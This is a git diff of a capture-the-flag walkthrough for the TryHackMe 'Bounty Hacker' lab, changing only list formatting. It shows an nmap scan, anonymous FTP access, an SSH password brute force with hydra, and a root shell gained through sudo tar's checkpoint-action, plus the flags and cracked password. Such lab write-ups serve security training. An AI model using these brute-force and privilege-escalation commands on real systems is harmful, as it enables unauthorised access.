@@ -6,11 +6,11 @@ pagination_prev: null
 
 ## Task 1: Living up to the title.
 ### Who wrote the task list?
-- Let's got search the IP address using our browser.
+Let's got search the IP address using our browser.
 
 ![2](https://github.com/Knign/Write-ups/assets/110326359/e9bbb1fa-8b2c-4ee0-a536-9851ae073374)
 
-- We can now run a `nmap` scan on the machine.
+We can now run a `nmap` scan on the machine.
 ```
 $ nmap -sC -sV 10.10.174.175
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-06 15:26 IST
@@ -47,14 +47,14 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 54.60 seconds
 ```
-- There are three open ports:
+There are three open ports:
 
 | Port | Service | 
 |------|---------|
 | 21 | ftp |
 | 22 | ssh |
 | 80 | http |
-- Let's login through FTP anonymously.
+Let's login through FTP anonymously.
 ```
 $ ftp anonymous@10.10.245.97
 Connected to 10.10.245.97.
@@ -64,7 +64,7 @@ Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp> 
 ```
-- Let's look at the contents of the directory
+Let's look at the contents of the directory
 ```
 ftp> ls
 200 EPRT command successful. Consider using EPSV.
@@ -73,7 +73,7 @@ ftp> ls
 -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
 226 Directory send OK.
 ```
-- We can download these files to our machine using the `get` command.
+We can download these files to our machine using the `get` command.
 ```
 ftp> get locks.txt
 local: locks.txt remote: locks.txt
@@ -90,7 +90,7 @@ local: task.txt remote: task.txt
 226 Transfer complete.
 68 bytes received in 00:00 (0.37 KiB/s)
 ```
-- Let's read the `task.txt` file.
+Let's read the `task.txt` file.
 ```
 $ cat task.txt 
 1.) Protect Vicious.
@@ -106,7 +106,7 @@ lin
 &nbsp;
 
 ### What service can you bruteforce with the text file found?
-- Since we saw that FTP, SSH and HTTP were the services running on the machine it is safe to saw that we can brute force SSH
+Since we saw that FTP, SSH and HTTP were the services running on the machine it is safe to saw that we can brute force SSH
 ### Answer
 ```
 SSH
@@ -115,7 +115,7 @@ SSH
 &nbsp;
 
 ### What is the users password?
-- Let's take a look at the `locks.txt` file
+Let's take a look at the `locks.txt` file
 ```
 $ cat locks.txt 
 rEddrAGON
@@ -145,8 +145,9 @@ rEDdrAGOnSyNDiCat3
 r3ddr@g0N
 ReDSynd1ca7e
 ```
-- Seems to be a bunch of passwords.
-- We can brute force SSH using the `hydra` utility.
+Seems to be a bunch of passwords.
+
+We can brute force SSH using the `hydra` utility.
 ```
 $ hydra -l lin -P locks.txt 10.10.245.97 ssh
 Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -162,7 +163,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-06 16:48:
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-06 16:48:12
 ```
-- So the password for the `lin` user is `RedDr4gonSynd1cat3`.
+So the password for the `lin` user is `RedDr4gonSynd1cat3`.
 ### Answer
 ```
 RedDr4gonSynd1cat3
@@ -171,7 +172,7 @@ RedDr4gonSynd1cat3
 &nbsp;
 
 ### user.txt
-- Let's login using the credentials we have.
+Let's login using the credentials we have.
 ```
 $ ssh lin@10.10.245.97  
 The authenticity of host '10.10.245.97 (10.10.245.97)' can't be established.
@@ -192,7 +193,7 @@ Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
 lin@bountyhacker:~/Desktop$ 
 ```
-- After lookin around we can see a `user.txt` file. Let's `cat` that file.
+After lookin around we can see a `user.txt` file. Let's `cat` that file.
 ```
 lin@bountyhacker:~/Desktop$ cat user.txt 
 THM{CR1M3_SyNd1C4T3}
@@ -203,7 +204,7 @@ THM{CR1M3_SyNd1C4T3}
 ```
 
 ### root.txt
-- We can list out the files that the `lin`  user is able to run using the following command:
+We can list out the files that the `lin`  user is able to run using the following command:
 ```
 lin@bountyhacker:~/Desktop$ sudo -l
 [sudo] password for lin: 
@@ -213,17 +214,17 @@ Matching Defaults entries for lin on bountyhacker:
 User lin may run the following commands on bountyhacker:
     (root) /bin/tar
 ```
-- We can now use GTFOBins to escalate our privilege.
+We can now use GTFOBins to escalate our privilege.
 
 ![3](https://github.com/Knign/Write-ups/assets/110326359/b7a6ded1-6568-47ea-808a-9a090e6a5bb8)
 
-- We will use the `Sudo` exploit.
+We will use the `Sudo` exploit.
 ```
 lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 tar: Removing leading `/' from member names
 # 
 ```
-- We now have root privilege and can cat the `root.txt` file. 
+We now have root privilege and can cat the `root.txt` file. 
 ```
 # cat root.txt  
 THM{80UN7Y_h4cK3r}
